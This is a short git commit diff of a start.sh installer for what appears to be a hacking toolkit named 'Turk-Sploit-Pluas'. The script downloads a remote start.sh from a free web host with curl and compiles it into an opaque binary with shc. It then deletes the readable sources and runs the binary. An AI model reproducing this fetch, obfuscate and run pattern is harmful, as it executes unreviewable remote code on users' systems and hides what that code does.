c0bb5e41803369515094f1a76ecf9bb538b6b709
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-08-07 11:55:11 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -7,12 +7,12 @@ cd shc-3.8.9/
 make
 curl -O https://turksibertimi-forum.000webhostapp.com/start.sh
 shc -f start.sh
-rm -rf $HOME/Turk-Sploit-Pluas/start.sh
+cd $HOME &&
+cp start.sh.x  $HOME/Turk-Sploit-Pluas/
 cd $HOME/shc-3.8.9/ && cp start.sh.x  $HOME/Turk-Sploit-Pluas/
 rm -rf $HOME/shc-3.8.9.tgz
 rm -rf $HOME/shc-3.8.9/
 cd $HOME &&
-cp start.sh.x  $HOME/Turk-Sploit-Pluas/
-cd $HOME &&
 rm -rf start.sh start.sh.x start.sh.x.c
+rm -rf $HOME/Turk-Sploit-Pluas/start.sh
 cd $HOME/Turk-Sploit-Pluas/ && ls && ./start.sh.x
